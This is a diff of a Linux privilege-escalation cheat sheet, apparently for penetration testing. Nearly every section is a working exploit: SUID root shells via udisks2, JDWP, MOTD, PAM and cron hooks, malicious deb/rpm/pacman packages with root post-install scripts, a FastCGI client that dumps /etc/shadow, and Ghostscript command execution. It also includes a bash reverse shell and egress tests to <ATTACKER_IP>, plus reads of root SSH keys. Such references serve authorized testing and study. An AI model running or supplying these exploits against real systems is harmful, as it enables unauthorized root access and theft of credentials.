+#### Living-off-the-land / LOTL variant
+
+```bash
+# Requires only git (already present if sudo allows it) + cat to create the patch
+# The patch format itself does the symlink traversal — no external tools
+```
+
 ### 4.5 Writable /etc/passwd
 ```bash
 # Check permissions
@@ -1889,13 +2601,38 @@ cp /bin/bash /tmp/xfs_mount/rootshell
 chmod u+s /tmp/xfs_mount/rootshell
 sudo umount /tmp/xfs_mount
 
-# Step 2: Trigger resize via udisks2 D-Bus interface
+# Step 2: Set up loop device for the image
+LOOP=$(losetup --find --show /tmp/evil.img)
+echo "[+] Loop device: $LOOP"
+
+# Step 3: Kill gvfs-udisks2-volume-monitor to avoid interference
+pkill -f gvfs-udisks2-volume-monitor 2>/dev/null
+
+# Step 4: Trigger resize via udisks2 D-Bus interface (full gdbus call)
 # (requires "allow_active" polkit auth — physical console OR CVE-2025-6018)
-gdbus call --system --dest org.freedesktop.UDisks2 ...
+gdbus call --system \
+  --dest org.freedesktop.UDisks2 \
+  --object-path /org/freedesktop/UDisks2/block_devices/$(basename $LOOP) \
+  --method org.freedesktop.UDisks2.Filesystem.Resize \
+  209715200 \
+  'a{sv} {}'
+# udisks mounts the XFS image WITHOUT nosuid → SUID binary is now live
+
+# Step 5: Find the mount point and execute
+mount | grep evil.img
+MPOINT=$(findmnt -n -o TARGET --source $LOOP)
+ls -la "$MPOINT/rootshell"
+"$MPOINT/rootshell" -p
+# uid=0(root)
 
 # CVE-2025-6018 (PAM spoofing — SUSE/openSUSE specific):
-# Manipulate environment variables via pam_env.so to trick pam_systemd
-# into treating SSH session as local console session → grants "allow_active"
+# Create ~/.pam_environment to trick pam_systemd into granting local-console status
+cat > ~/.pam_environment <<'PAMEOF'
+XDG_SEAT OVERRIDE="seat0"
+XDG_VTNR OVERRIDE="1"
+PAMEOF
+# On next SSH login, pam_env.so reads these → pam_systemd treats session as local
+# → polkit grants "allow_active" → D-Bus resize call above succeeds without physical console
 ```
 
 #### CrackArmor — CVE-2026-23268 / CVE-2026-23269 (Qualys TRU)
@@ -2735,7 +3472,2422 @@ ps auxf | grep -i "mysql\|redis\|postgres\|mongo\|apache\|nginx"
 cat /proc/*/cmdline 2>/dev/null | tr '\0' ' ' | grep -i "password\|pass\|token"
 ```
 
+### 4.15b Egress Posture Enumeration — Firewall Rule Analysis + Shell Type Decision
+
+After foothold, determine what outbound traffic is allowed to choose the right exfil/C2 channel: reverse shell (egress TCP), bind shell (ingress TCP), or OOB DNS/ICMP.
+
+```bash
+# === ENUMERATE FIREWALL RULES (run all — one will work) ===
+
+# iptables (legacy)
+iptables -L -n -v 2>/dev/null
+iptables -L OUTPUT -n -v 2>/dev/null          # OUTPUT chain = egress rules
+iptables-save 2>/dev/null                      # full ruleset in iptables-restore format
+
+# nftables (modern replacement)
+nft list ruleset 2>/dev/null
+
+# ufw (Ubuntu frontend)
+ufw status verbose 2>/dev/null
+
+# firewalld (RHEL/CentOS)
+firewall-cmd --list-all 2>/dev/null
+firewall-cmd --list-ports 2>/dev/null
+firewall-cmd --get-active-zones 2>/dev/null
+
+# Saved rules files
+cat /etc/iptables/rules.v4 2>/dev/null
+cat /etc/iptables/rules.v6 2>/dev/null
+cat /etc/nftables.conf 2>/dev/null
+cat /etc/sysconfig/iptables 2>/dev/null        # RHEL/CentOS
+```
+
+```bash
+# === INTERPRET OUTPUT CHAIN — decision matrix ===
+# OUTPUT policy ACCEPT + no DROP rules → reverse shell on any port works
+# OUTPUT allows TCP 80,443 only → reverse shell on 80 or 443
+# OUTPUT allows DNS (UDP 53) only → DNS tunnel (dnscat2, iodine)
+# OUTPUT DROP all → bind shell (requires ingress allowed) or DNS/ICMP OOB
+# No iptables/nft output → likely no host firewall (cloud SG may still block)
+
+# Quick egress test (from target — does traffic reach attacker?)
+# On attacker: nc -lvnp 443
+# On target:
+bash -c 'echo test > /dev/tcp/<ATTACKER_IP>/443' 2>/dev/null && echo "TCP 443 EGRESS OK"
+bash -c 'echo test > /dev/tcp/<ATTACKER_IP>/80' 2>/dev/null && echo "TCP 80 EGRESS OK"
+bash -c 'echo test > /dev/tcp/<ATTACKER_IP>/53' 2>/dev/null && echo "TCP 53 EGRESS OK"
+
+# DNS egress test (almost never blocked)
+nslookup egress-test.<ATTACKER_DNS> 2>/dev/null
+host egress-test.<ATTACKER_DNS> 2>/dev/null
+dig egress-test.<ATTACKER_DNS> 2>/dev/null
+```
+
+```bash
+# === DECISION MATRIX ===
+# Egress open (any port) → bash reverse shell (see Quick Reference: Reverse Shells)
+# Egress 80/443 only → reverse shell on those ports, or socat/chisel over HTTPS
+# Egress DNS only → dnscat2, iodine, dns2tcp
+# Egress ICMP only → icmpsh, hans
+# No egress at all → bind shell on open inbound port, or data-only OOB via DNS TXT
+# For pivoting/tunneling details → see tunneling-pivoting.md
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# All commands above are LOTL — iptables, nft, ufw, firewall-cmd, cat, bash /dev/tcp
+# The /dev/tcp egress test uses bash built-in (no netcat/curl needed)
+# For systems without bash: use /dev/udp or printf to /proc/net/tcp to read connection state
+cat /proc/net/tcp | awk '{print $2}' | grep -v local   # view established connections
+```
+
+### 4.15c JDWP (Java Debug Wire Protocol) Exploitation
+
+When a root-owned Java process exposes JDWP (typically port 5005 or 8000, detected via `-agentlib:jdwp` in process args), attach with `jdb` and execute arbitrary commands as the process owner.
+
+```bash
+# Detect — find JDWP-enabled Java processes
+ps auxf | grep -E "\-agentlib:jdwp|dt_socket"
+ss -tlnp | grep -E "5005|8000|8787"
+# Example: root 1234 java -agentlib:jdwp=transport=dt_socket,server=y,address=5005 -jar app.jar
+```
+
+```bash
+# Method 1: jdb (ships with JDK) — interactive debugger
+jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=<JDWP_PORT>
+
+# Inside jdb — set breakpoint on a method that will be called (Thread.sleep is reliable)
+> threads                                        # list threads
+> thread <THREAD_ID>                            # select a thread
+> suspend <THREAD_ID>                           # pause it
+> print new java.lang.Runtime().exec("id")      # test command execution
+> print new java.lang.Runtime().exec(new String[]{"/bin/bash","-c","cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"})
+
+# If exec() hangs (common), use ProcessBuilder instead:
+> print new java.lang.ProcessBuilder(new String[]{"/bin/bash","-c","cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"}).start()
+
+# Exit jdb, collect root shell
+> quit
+/tmp/rootbash -p
+```
+
+```bash
+# Method 2: One-liner via jdb -sourcepath (non-interactive, scriptable)
+echo 'print new java.lang.ProcessBuilder(new String[]{"/bin/bash","-c","cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"}).start()' | \
+  jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=<JDWP_PORT>
+sleep 2; /tmp/rootbash -p
+```
+
+```bash
+# Method 3: Reverse shell via JDWP
+# In jdb:
+> print new java.lang.ProcessBuilder(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1"}).start()
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# jdb ships with any JDK installation (likely present if Java app is running)
+which jdb 2>/dev/null
+find / -name "jdb" 2>/dev/null
+# If jdb not available but python3 is:
+# Use a raw JDWP protocol script (handshake + command packets over TCP)
+# The JDWP handshake is: client sends "JDWP-Handshake" (14 bytes), server echoes same
+python3 -c '
+import socket
+s = socket.socket()
+s.connect(("127.0.0.1", <JDWP_PORT>))
+s.send(b"JDWP-Handshake")
+print(s.recv(14))  # confirms JDWP is alive
+s.close()
+'
+# Full exploitation without jdb requires implementing JDWP packet protocol — use jdb when possible
+```
+
+### 4.15d Kernel-Exploit PoC Modification — Patching Hardcoded Paths and Cross-Compilation
+
+When a kernel exploit PoC targets a different distro (hardcoded `/etc/lsb-release` paths, wrong libc offsets, distro-specific struct offsets), patch it for the target before attempting exploitation. Also covers cross-compilation when the target lacks gcc.
+
+```bash
+# Step 1: Verify target kernel and distro vs PoC assumptions
+uname -r
+cat /etc/os-release
+ldd --version 2>&1 | head -1
+# Compare against PoC's README/comments for assumed distro/kernel/libc
+
+# Step 2: Common modifications needed
+# A) Hardcoded paths (many PoCs check /etc/lsb-release, /etc/debian_version, etc.)
+grep -n "/etc/" exploit.c | head -10
+# If PoC checks for specific distro string, patch it or bypass the check:
+sed -i 's|/etc/lsb-release|/etc/os-release|g' exploit.c
+# Or simply comment out the distro check if you've verified kernel version matches
+
+# B) Libc offsets (Baron Samedit, stack-based exploits)
+ldd /usr/bin/sudo 2>/dev/null | grep libc
+readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep -E ' system$| execve$'
+strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
+# Patch offset values in the PoC source
+
+# C) Struct offsets (kernel exploits — task_struct, cred, etc.)
+# If PoC provides a lookup script: ./get_offsets.sh
+# Otherwise extract from /proc/kallsyms or System.map if readable
+cat /proc/kallsyms 2>/dev/null | grep -E "commit_creds|prepare_kernel_cred"
+```
+
+```bash
+# Step 3: Compile on target (if gcc available)
+gcc -o exploit exploit.c -lpthread -static 2>/dev/null
+# Static linking avoids runtime libc mismatch
+
+# Step 4: Cross-compile if target lacks gcc
+# On attacker (match target architecture):
+# x86_64 target:
+gcc -static -o exploit exploit.c -lpthread
+# i386 target from x86_64 attacker:
+gcc -m32 -static -o exploit exploit.c -lpthread
+# ARM target:
+arm-linux-gnueabihf-gcc -static -o exploit exploit.c -lpthread
+
+# Transfer to target
+# python3 -m http.server 80 (on attacker)
+# wget http://<ATTACKER_IP>/exploit (on target)
+chmod +x exploit && ./exploit
+```
+
+```bash
+# Step 5: If target has no writable+executable filesystem (noexec /tmp, etc.)
+# Run from /dev/shm (usually exec-allowed, tmpfs)
+cp exploit /dev/shm/ && /dev/shm/exploit
+# Or use memfd_create to run from memory (advanced)
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# If target has no gcc and no way to transfer binaries:
+# Some exploits have bash/python equivalents (DirtyPipe python PoC, PwnKit python)
+python3 CVE-2021-4034.py        # PwnKit — no compilation needed
+python3 CVE-2022-0847.py        # DirtyPipe python variant
+# For C-only exploits: cross-compile statically on attacker, transfer the single binary
+```
+
+### 4.16 MOTD Privesc — Writable /etc/update-motd.d/ Scripts Run as Root on SSH Login
+
+Scripts in `/etc/update-motd.d/` execute as root every time a user logs in via SSH. If any script is writable by your user (or a group you belong to), appending a command yields root execution on next login.
+
+```bash
+# Detect — check for writable MOTD scripts
+ls -la /etc/update-motd.d/
+find /etc/update-motd.d/ -writable 2>/dev/null
+# Also check the legacy /etc/motd path (static, less useful) vs dynamic scripts
+
+# Verify scripts run as root on login
+file /etc/update-motd.d/*
+head -5 /etc/update-motd.d/*
+```
+
+```bash
+# Exploit — append payload to writable MOTD script
+echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /etc/update-motd.d/<WRITABLE_SCRIPT>
+
+# Trigger — SSH back into the box (even as current user)
+ssh <USER>@127.0.0.1
+# After login banner displays: scripts fired as root
+/tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Only echo needed — the MOTD mechanism itself runs the script as root
+# No tools, no downloads. SSH login is the trigger.
+echo 'id > /tmp/motd_proof' >> /etc/update-motd.d/<WRITABLE_SCRIPT>
+ssh <USER>@127.0.0.1
+cat /tmp/motd_proof
+```
+
+### 4.16b mosh-server sudo NOPASSWD Privesc
+
+When `sudo -l` shows `(root) NOPASSWD: /usr/bin/mosh-server`, mosh-server spawns a shell as root. Unlike most GTFOBins entries, mosh-server is NOT listed there — but it drops you into an interactive root shell by design because its purpose is to run a user session on the remote end.
+
+```bash
+# Detect
+sudo -l | grep mosh-server
+
+# Exploit — mosh-server spawns $SHELL (or /bin/bash) for the target user
+# When run via sudo as root, it spawns a root shell
+sudo /usr/bin/mosh-server new -s -- /bin/bash
+# You land in an interactive root bash session
+
+# Alternative: specify the shell explicitly
+sudo /usr/bin/mosh-server new -s -- /bin/sh
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# mosh-server is the only binary needed (already present if sudo allows it)
+# No downloads, no compilation — it IS the shell spawner
+sudo /usr/bin/mosh-server new -s -- /bin/bash -p
+id
+```
+
+### 4.16c PAM Session Hook (pam_exec.so) — Writable Script Triggered on Login
+
+If `pam_exec.so` invokes a script on session open/close and that script is writable, any appended command executes as root on next authentication event (SSH login, su, sudo).
+
+```bash
+# Detect — find pam_exec.so references with writable target scripts
+grep -r "pam_exec" /etc/pam.d/ 2>/dev/null
+# Example: session optional pam_exec.so /usr/local/bin/on_login.sh
+# Check if the referenced script is writable
+ls -la /usr/local/bin/on_login.sh
+find / -name "*.sh" -path "*/pam*" 2>/dev/null
+
+# Also check PAM config for any script paths
+grep -rE "exec|script" /etc/pam.d/ 2>/dev/null
+```
+
+```bash
+# Exploit — append to writable pam_exec script
+echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> <PAM_EXEC_SCRIPT_PATH>
+
+# Trigger — any PAM session event (SSH login, su, sudo)
+ssh <USER>@127.0.0.1
+# Or simply: su - <USER>
+
+/tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure echo — no tools needed. The PAM stack itself runs the script as root.
+echo 'id > /tmp/pam_proof' >> <PAM_EXEC_SCRIPT_PATH>
+# Trigger via SSH or su, then check /tmp/pam_proof
+```
+
+### 4.16d Named-Pipe TOCTOU Bypass on Hash-Checking Cron Runner
+
+When a root cron job computes a hash of a script (integrity check) then executes it, a FIFO (named pipe) creates a race window: the hash-check reads attacker-controlled benign content, then the execute phase reads the malicious payload through the same FIFO.
+
+```bash
+# Detect — identify cron scripts that hash-check before execution
+grep -rE "md5sum|sha256sum|sha1sum" /etc/cron* /var/spool/cron/ /opt/ /usr/local/bin/ 2>/dev/null
+# Pattern: script does `hash=$(sha256sum $file)` then `if [ "$hash" == "$expected" ]; then bash $file; fi`
+# The file path between hash-check and execution is the TOCTOU window
+```
+
+```bash
+# Exploit — replace the target file with a FIFO
+rm <TARGET_SCRIPT_PATH>
+mkfifo <TARGET_SCRIPT_PATH>
+
+# Serve benign content for the hash check, then malicious content for execution
+# Terminal 1 — feed the hash check (must match expected hash)
+echo '#!/bin/bash' > /tmp/benign.sh
+echo '# legitimate script content matching expected hash' >> /tmp/benign.sh
+cat /tmp/benign.sh > <TARGET_SCRIPT_PATH>   # first reader (hash check) gets this
+
+# Terminal 2 — feed the execution phase
+echo '#!/bin/bash' > /tmp/evil.sh
+echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /tmp/evil.sh
+cat /tmp/evil.sh > <TARGET_SCRIPT_PATH>     # second reader (bash $file) gets this
+
+# Automated version — loop to handle timing
+while true; do
+  cat /tmp/benign.sh > <TARGET_SCRIPT_PATH> 2>/dev/null
+  cat /tmp/evil.sh > <TARGET_SCRIPT_PATH> 2>/dev/null
+done &
+
+# Wait for cron execution → /tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# mkfifo + cat + echo are all POSIX builtins/standard utilities
+# No external tools needed — the race is between two cat writes to the FIFO
+mkfifo /tmp/test_fifo
+echo "benign" > /tmp/test_fifo &   # demonstrates the blocking write behavior
+cat /tmp/test_fifo                  # unblocks the writer
+```
+
+### 4.16e Pacman/dpkg/rpm Post-Install Hook Abuse via sudo NOPASSWD Package Manager
+
+When `sudo -l` allows a package manager (`pacman -U`, `dpkg -i`, `apt install`, `rpm -i`) without password, craft a malicious package with a post-install script that executes as root during installation.
+
+```bash
+# Detect
+sudo -l | grep -iE "pacman|dpkg|apt|rpm|yum"
+```
+
+```bash
+# === Arch Linux: pacman -U with .install hook ===
+# Create minimal package with post_install() hook
+mkdir -p /tmp/evil-pkg
+cat > /tmp/evil-pkg/.PKGINFO <<'EOF'
+pkgname = pwn
+pkgver = 1.0-1
+pkgdesc = pwn
+arch = x86_64
+size = 1024
+EOF
+
+cat > /tmp/evil-pkg/.INSTALL <<'EOF'
+post_install() {
+  cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
+}
+EOF
+
+cd /tmp/evil-pkg
+tar czf /tmp/pwn-1.0-1-x86_64.pkg.tar.gz .PKGINFO .INSTALL
+sudo pacman -U --noconfirm /tmp/pwn-1.0-1-x86_64.pkg.tar.gz
+/tmp/rootbash -p
+```
+
+```bash
+# === Debian/Ubuntu: dpkg -i with postinst script ===
+mkdir -p /tmp/evil-deb/DEBIAN
+cat > /tmp/evil-deb/DEBIAN/control <<'EOF'
+Package: pwn
+Version: 1.0
+Architecture: all
+Maintainer: x
+Description: x
+EOF
+
+cat > /tmp/evil-deb/DEBIAN/postinst <<'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
+EOF
+chmod 755 /tmp/evil-deb/DEBIAN/postinst
+
+dpkg-deb --build /tmp/evil-deb /tmp/pwn.deb
+sudo dpkg -i /tmp/pwn.deb
+/tmp/rootbash -p
+```
+
+```bash
+# === RHEL/CentOS: rpm with %post scriptlet ===
+mkdir -p /tmp/evil-rpm/BUILD
+cat > /tmp/evil-rpm/pwn.spec <<'EOF'
+Name: pwn
+Version: 1.0
+Release: 1
+Summary: x
+License: MIT
+%description
+x
+%post
+cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
+%files
+EOF
+
+rpmbuild --define "_topdir /tmp/evil-rpm" -bb /tmp/evil-rpm/pwn.spec
+sudo rpm -i /tmp/evil-rpm/RPMS/*/pwn-1.0-1.*.rpm --nodeps
+/tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# dpkg-deb ships with any Debian/Ubuntu system — no additional tools
+# For the Debian method: mkdir + cat + chmod + dpkg-deb are all standard
+mkdir -p /tmp/d/DEBIAN
+printf 'Package: x\nVersion: 1\nArchitecture: all\nMaintainer: x\nDescription: x\n' > /tmp/d/DEBIAN/control
+printf '#!/bin/sh\nid > /tmp/dpkg_proof\n' > /tmp/d/DEBIAN/postinst
+chmod 755 /tmp/d/DEBIAN/postinst
+dpkg-deb --build /tmp/d /tmp/x.deb
+sudo dpkg -i /tmp/x.deb
+```
+
+### 4.16f Postfix Content-Filter Script Abuse — Writable Filter Triggered via SMTP
+
+When Postfix uses a content_filter directive (altermime, disclaimer script) and the filter script is writable, injecting a command and sending mail triggers execution as the filter user (often root or a service account with sudo).
+
+```bash
+# Detect — find content_filter configuration
+grep -i "content_filter" /etc/postfix/main.cf 2>/dev/null
+grep -i "pipe" /etc/postfix/master.cf 2>/dev/null
+# Look for lines like: dfilt unix - n n - - pipe user=filter argv=/usr/local/bin/disclaimer.sh
+# Check if the referenced script is writable
+ls -la /usr/local/bin/disclaimer.sh 2>/dev/null
+find / -name "disclaimer*" -o -name "altermime*" -o -name "*filter*.sh" 2>/dev/null | xargs ls -la 2>/dev/null
+```
+
+```bash
+# Identify the filter allowlist (only processes mail to/from listed addresses)
+cat /etc/postfix/disclaimer_addresses 2>/dev/null
+# If present, your FROM/TO must match an entry in this file
+
+# Exploit — inject command into writable filter script
+echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> <FILTER_SCRIPT_PATH>
+
+# Trigger — send mail through the local Postfix instance
+# Use nc to speak raw SMTP (LOTL — no sendmail/swaks needed)
+{
+echo "EHLO localhost"
+sleep 1
+echo "MAIL FROM:<USER>@<DOMAIN>"
+sleep 1
+echo "RCPT TO:<ALLOWED_RECIPIENT>@<DOMAIN>"
+sleep 1
+echo "DATA"
+sleep 1
+echo "Subject: trigger"
+echo ""
+echo "test"
+echo "."
+sleep 1
+echo "QUIT"
+} | nc 127.0.0.1 25
+
+# Wait for filter processing → /tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# echo + nc (netcat) or bash /dev/tcp for SMTP — no swaks/sendmail needed
+{
+printf "EHLO x\r\nMAIL FROM:<a@b>\r\nRCPT TO:<c@d>\r\nDATA\r\nSubject: x\r\n\r\nx\r\n.\r\nQUIT\r\n"
+} > /dev/tcp/127.0.0.1/25
+```
+
+### 4.16g OpenSSH 7.2p1/7.2p2 xauth Command Injection (CVE-2016-3115)
+
+When SSH `X11Forwarding` is enabled and the server runs OpenSSH 7.2p1 or 7.2p2, an authenticated user can inject commands into the xauth process. Useful for bypassing restricted shells (ForceCommand, rbash) since xauth injection fires pre-shell.
+
+```bash
+# Detect — check SSH version and X11 forwarding
+ssh -V 2>&1    # client version
+nc -nv <TARGET> 22 | head -1    # server banner: OpenSSH_7.2p1 or 7.2p2
+
+# Check if X11Forwarding is enabled
+grep -i "X11Forwarding" /etc/ssh/sshd_config 2>/dev/null
+# Also: ssh -v -X <TARGET> shows "Requesting X11 forwarding" in debug
+```
+
+```bash
+# Exploit — inject via xauth during SSH connection with -X
+# The xauth cookie value is processed unsanitized — inject shell metacharacters
+ssh -X <USER>@<TARGET> -o "XAuthLocation=/tmp/xauth_inject"
+
+# Method: use ssh -o ProxyCommand to inject into the xauth protocol
+# The vulnerability allows newline injection in the xauth cookie:
+ssh <USER>@<TARGET> -X -v 2>&1
+# In the ForceCommand/restricted shell context, xauth runs BEFORE the shell restriction
+
+# Payload via xauth add — read arbitrary files:
+# (from SSH client session with -X forwarding active)
+xauth add <TARGET>:10 MIT-MAGIC-COOKIE-1 $(xxd -p /etc/shadow | head -c 40)
+# Or: info command injection through the cookie value with shell metacharacters
+
+# Scripted exploitation — inject newline into display value:
+ssh -X -o 'XAuthLocation=blah' <USER>@<TARGET> "echo \$(id) > /tmp/xauth_proof"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Only ssh client needed (standard on any Linux/Mac)
+# The injection happens through the SSH X11 forwarding protocol itself
+# No tools to install — ssh -X is the attack vector
+ssh -X <USER>@<TARGET>
+```
+
+### 4.16h PHP disable_functions Bypass via PHPRC Environment + Privileged Daemon
+
+When a privileged daemon reads a `PHPRC` environment variable (or loads PHP config from an attacker-controllable JSON/YAML config), point it at a custom `php.ini` that clears `disable_functions` and sets `auto_prepend_file` to your payload. The daemon executes PHP without restrictions as root.
+
+```bash
+# Detect — identify privileged processes invoking PHP with controllable config
+ps auxf | grep -iE "php|daemon" | grep root
+# Look for custom daemons that invoke PHP internally
+find / -type f -executable -exec grep -l "PHPRC\|php.ini\|php_ini" {} \; 2>/dev/null | head -20
+
+# Check if a daemon config file (JSON/YAML/INI) references a PHP config path
+find /etc /opt -name "*.json" -o -name "*.yaml" -o -name "*.yml" -o -name "*.conf" 2>/dev/null | \
+  xargs grep -liE "php.*ini\|PHPRC\|php_config" 2>/dev/null
+
+# Reverse-engineer custom daemon (if binary) to find env var / config key
+strings <DAEMON_BINARY> | grep -iE "PHPRC\|php.ini\|config_path\|ini_path"
+```
+
+```bash
+# Exploit — craft php.ini that disables all restrictions + prepends payload
+mkdir -p /tmp/phprc
+cat > /tmp/phprc/php.ini <<'EOF'
+disable_functions =
+open_basedir =
+auto_prepend_file = /tmp/phprc/pwn.php
+EOF
+
+cat > /tmp/phprc/pwn.php <<'EOF'
+<?php system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"); ?>
+EOF
+
+# Method A: set PHPRC env if daemon reads it (e.g., writable systemd override)
+mkdir -p /etc/systemd/system/<DAEMON_SERVICE>.service.d 2>/dev/null
+cat > /etc/systemd/system/<DAEMON_SERVICE>.service.d/override.conf <<'EOF'
+[Service]
+Environment=PHPRC=/tmp/phprc
+EOF
+systemctl daemon-reload && systemctl restart <DAEMON_SERVICE>
+
+# Method B: modify daemon's own config if writable
+# e.g., JSON config with "php_ini_path": "/tmp/phprc/php.ini"
+# Restart daemon or wait for config reload
+
+/tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# mkdir + cat to create php.ini and payload — all POSIX standard
+# The PHP engine itself does the code execution via auto_prepend_file
+# If you cannot modify systemd units, check for writable daemon config files
+mkdir -p /tmp/phprc
+printf "[PHP]\ndisable_functions=\nauto_prepend_file=/tmp/phprc/p.php\n" > /tmp/phprc/php.ini
+printf "<?php system('id > /tmp/php_proof'); ?>" > /tmp/phprc/p.php
+```
+
+### 4.16i PHP-FPM (FastCGI) Direct Protocol RCE on Port 9000
+
+When PHP-FPM listens on an internal port (9000) or unix socket without authentication, send raw FastCGI packets to execute arbitrary PHP code as the FPM pool user. Common lateral movement vector when you compromise a web container but PHP-FPM runs as a different (often more privileged) user.
+
+```bash
+# Detect — find PHP-FPM listening sockets
+ss -tlnp | grep -E "9000|php-fpm"
+find / -name "*.sock" -path "*php*" 2>/dev/null
+ps auxf | grep php-fpm
+# Check pool user (www.conf → user = <POOL_USER>)
+cat /etc/php/*/fpm/pool.d/www.conf 2>/dev/null | grep -E "^user|^group|^listen"
+```
+
+```bash
+# Method 1: cgi-fcgi (ships with libfcgi-bin on Debian/Ubuntu)
+SCRIPT_FILENAME=/var/www/html/index.php \
+SCRIPT_NAME=/index.php \
+REQUEST_METHOD=GET \
+QUERY_STRING="cmd=id" \
+cgi-fcgi -bind -connect 127.0.0.1:9000
+
+# Method 2: Python one-liner FastCGI client (no pip install — uses struct/socket only)
+python3 -c '
+import socket, struct
+
+def build_fcgi_record(rtype, rid, content):
+    clen = len(content)
+    pad = (8 - clen % 8) % 8
+    return struct.pack(">BBHHBx", 1, rtype, rid, clen, pad) + content + b"\x00"*pad
+
+def build_params(params):
+    data = b""
+    for k, v in params.items():
+        kl, vl = len(k), len(v)
+        if kl < 128: data += struct.pack("B", kl)
+        else: data += struct.pack(">I", kl | 0x80000000)
+        if vl < 128: data += struct.pack("B", vl)
+        else: data += struct.pack(">I", vl | 0x80000000)
+        data += k.encode() + v.encode()
+    return data
+
+params = {
+    "SCRIPT_FILENAME": "/var/www/html/index.php",
+    "SCRIPT_NAME": "/index.php",
+    "REQUEST_METHOD": "GET",
+    "DOCUMENT_ROOT": "/var/www/html",
+    "PHP_VALUE": "auto_prepend_file = php://input",
+    "PHP_ADMIN_VALUE": "allow_url_include = On\ndisable_functions = \nopen_basedir = /"
+}
+body = b"<?php system(\"id; cat /etc/shadow\"); ?>"
+s = socket.socket()
+s.connect(("127.0.0.1", 9000))
+s.send(build_fcgi_record(1, 1, struct.pack(">HHBxxx", 0, 0, 0)))  # BEGIN_REQUEST
+s.send(build_fcgi_record(4, 1, build_params(params)))               # PARAMS
+s.send(build_fcgi_record(4, 1, b""))                                # PARAMS end
+s.send(build_fcgi_record(5, 1, body))                               # STDIN
+s.send(build_fcgi_record(5, 1, b""))                                # STDIN end
+print(s.recv(65536).decode(errors="replace"))
+s.close()
+'
+```
+
+```bash
+# Method 3: Unix socket variant
+python3 -c '
+import socket
+# Same build_fcgi_record and build_params as above...
+s = socket.socket(socket.AF_UNIX)
+s.connect("/run/php/php-fpm.sock")
+# ... same send/recv pattern
+'
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# cgi-fcgi is the LOTL tool (part of libfcgi-bin, often present on PHP servers)
+which cgi-fcgi 2>/dev/null
+# If unavailable, the python3 method above uses only stdlib (socket + struct)
+# No pip install needed — works on any system with python3
+```
+
+### 4.16j PostScript/Ghostscript Template Injection (ps2pdf -dNOSAFER)
+
+When a cron job or web service converts user-supplied PostScript/EPS files via `gs` or `ps2pdf` without `-dSAFER`, Ghostscript's PostScript interpreter can read/write arbitrary files and execute commands via the `(%pipe%)` device.
+
+```bash
+# Detect — find Ghostscript invocations
+grep -rE "gs |ghostscript|ps2pdf|eps2pdf" /etc/cron* /opt/ /usr/local/bin/ /var/www/ 2>/dev/null
+ps auxf | grep -iE "gs |ghostscript" | grep -v grep
+# Check if -dSAFER is present (if absent → vulnerable)
+# Also check for -dNOSAFER which explicitly disables sandboxing
+```
+
+```bash
+# Exploit A: Arbitrary file read via PostScript
+cat > /tmp/evil.ps <<'EOF'
+%!PS
+(/etc/shadow) (r) file
+256 string readstring pop
+(output.txt) (w) file dup 3 -1 roll writestring closefile
+quit
+EOF
+# If the cron/service processes /tmp/evil.ps → /etc/shadow content written to output.txt
+
+# Exploit B: Command execution via %pipe% device
+cat > /tmp/evil.ps <<'EOF'
+%!PS
+(%pipe%cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash) (w) file closefile
+quit
+EOF
+# Place in the directory the ps2pdf job processes
+
+# Exploit C: File write (e.g., SSH key injection)
+cat > /tmp/evil.ps <<'EOF'
+%!PS
+(/root/.ssh/authorized_keys) (w) file
+dup (<ATTACKER_PUB_KEY>) writestring
+closefile quit
+EOF
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Only cat/echo needed to create the .ps file — Ghostscript does the execution
+# PostScript IS the programming language — no external tools needed in the payload
+# The %pipe% device is Ghostscript's built-in command execution facility
+echo '%!PS' > /tmp/test.ps
+echo '(%pipe%id > /tmp/gs_proof) (w) file closefile quit' >> /tmp/test.ps
+```
+
+### 4.16k PyInstaller spec-file Abuse via sudo NOPASSWD — Read Root Files with datas=[]
+
+When `sudo -l` allows `pyinstaller` (or a wrapper that calls it), a `.spec` file's `datas=[('/etc/shadow', '.')]` directive copies arbitrary root-owned files into the build output directory readable by the attacker.
+
+```bash
+# Detect
+sudo -l | grep -iE "pyinstaller"
+which pyinstaller 2>/dev/null
+```
+
+```bash
+# Exploit — craft .spec file that bundles root-only files into output
+cat > /tmp/pwn.spec <<'EOF'
+# PyInstaller spec — bundles target files into dist/
+a = Analysis(['dummy.py'], datas=[('/etc/shadow', '.'), ('/root/.ssh/id_rsa', '.')], pathex=['/tmp'])
+pyz = PYZ(a.pure)
+exe = EXE(pyz, a.scripts, a.binaries, a.datas, name='pwn')
+EOF
+
+echo "print('x')" > /tmp/dummy.py
